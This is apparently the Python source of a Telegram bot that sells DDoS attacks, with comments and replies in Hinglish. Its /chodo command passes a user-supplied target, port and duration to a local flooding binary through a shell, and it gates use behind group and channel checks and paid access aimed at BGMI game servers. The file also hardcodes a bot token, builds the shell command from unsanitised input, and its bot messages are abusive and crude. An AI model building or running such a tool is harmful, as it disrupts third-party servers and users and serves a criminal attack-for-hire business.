import telebot
import subprocess
import threading
import os
import signal
import copy

from keep_alive import keep_alive
keep_alive()  # Yeh function bot ko active rakhega
# Bot Token
BOT_TOKEN = "8187175703:AAHzPK8If6V3LO2_WBu004xX_P5l8yOjkOM"
bot = telebot.TeleBot(BOT_TOKEN)

# Allowed Group IDs
ALLOWED_GROUPS = {"-1002382674139"}

# Required Channels
REQUIRED_CHANNELS = ["@BADMOSH100"]

# Feedback Pending Dictionary (User ke base pe feedback track karne ke liye)
feedback_pending = {}

# Active Attack Processes (User ID ke base pe track)
attack_processes = {}

# Attack Start Karne Wale User ko Track Karna
attack_owners = {}

# ✅ Function to check if user is a member of required channels
def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member_status = bot.get_chat_member(channel, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

# ✅ Function to start the attack
def start_attack(target, port, duration, message):
    try:
        user_id = message.from_user.id
        chat_id = str(message.chat.id)

        feedback_pending[user_id] = True  # ✅ Feedback required
        bot.reply_to(message, f"✅ Chudai started on {target}:{port} for {duration} seconds. \n Send FEEDBACK \n \n DDos Na lge ya use stop krna ho tab use /ruko")

        attack_command = f"{os.path.abspath('./ranbal')} {target} {port} {duration} 10 200"
        process = subprocess.Popen(attack_command, shell=True, preexec_fn=os.setsid)

        # ✅ Process track karo
        attack_processes[chat_id] = process
        attack_owners[chat_id] = user_id  

        process.wait()

        bot.reply_to(message, f"✅ Chudai completed on {target}:{port} for {duration} seconds.")

        # ✅ Process complete hone ke baad remove karo
        attack_processes.pop(chat_id, None)
        attack_owners.pop(chat_id, None)

    except Exception as e:
        bot.reply_to(message, f"❌ Error while starting attack: {e}")

# ✅ Handler for /chodo command (attack)
@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    user_id = message.from_user.id
    chat_id = str(message.chat.id)

    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ Group me USE kr idhar MAA kiu Chudane Aya hai.")
        return

    if not is_member(user_id):
        bot.reply_to(message, f"❌ You must join [BADMOSH100](https://t.me/BADMOSH100) before using this command.", parse_mode="Markdown")
        return

    if feedback_pending.get(user_id, False):
        bot.reply_to(message, "❌ Pehle apna feedback (SCREENSHOT) do, tabhi agla chudai kar sakte ho! 📸")
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <target> <port> <time>")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    try:
        port = int(port)
        duration = int(duration)

        if duration > 120:
            bot.reply_to(message, "❌ Error: Time interval must be less than 120 seconds.")
            return

        message_copy = copy.deepcopy(message)

        thread = threading.Thread(target=start_attack, args=(target, port, duration, message_copy))
        thread.start()

    except ValueError:
        bot.reply_to(message, "❌ Error: Port and time must be numbers.")

# ✅ Handler for /ruko (Only the Attack Starter Can Stop)
@bot.message_handler(commands=["ruko"])
def stop_attack(message):
    user_id = message.from_user.id
    chat_id = str(message.chat.id)

    if chat_id in attack_processes:
        if attack_owners.get(chat_id) == user_id:  # ✅ Sirf jisne attack start kiya uske liye
            process = attack_processes[chat_id]
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGINT)  # ✅ Stop attack
                bot.reply_to(message, "🛑 Attack ruk gaya successfully!")

                attack_processes.pop(chat_id, None)  # ✅ Process remove karo
                attack_owners.pop(chat_id, None)  # ✅ Owner remove karo

            except Exception as e:
                bot.reply_to(message, f"❌ Error stopping attack: {e}")
        else:
            bot.reply_to(message, "❌ Tumne attack start hi nahi kiya, to rokoge kaise?")
    else:
        bot.reply_to(message, "❌ Koi active attack nahi mila!")

# ✅ Handler for receiving photos as feedback
@bot.message_handler(content_types=["photo"])
def handle_photo_feedback(message):
    user_id = message.from_user.id
    if feedback_pending.get(user_id, False):
        feedback_pending[user_id] = False
        bot.reply_to(message, "✅ Feedback received! Ab dobara chudai kar sakte ho lekin old ya faltu photo bheje to tumhe warn ⚠️ ya direct BAN bhi mil sakta hai 😎")

# ✅ Handler for /help command
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''
💥 /chodo : 😫 BGMI WALO KI MAA KO CHODO 🥵. 
💥/ruko : CHUDAI rokne ke liye
Regards :- @BADMOSH_X_GYRANGE  
Official Channel :- https://t.me/BADMOSH100
'''
    bot.reply_to(message, help_text)

# ✅ Handler for /start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''☠️ Gyrange ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
🤗 Try To Run This Command : /help 
💵 BUY :- @BADMOSH_X_GYRANGE'''
    bot.reply_to(message, response)

# ✅ Start the bot
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Error: {e}")
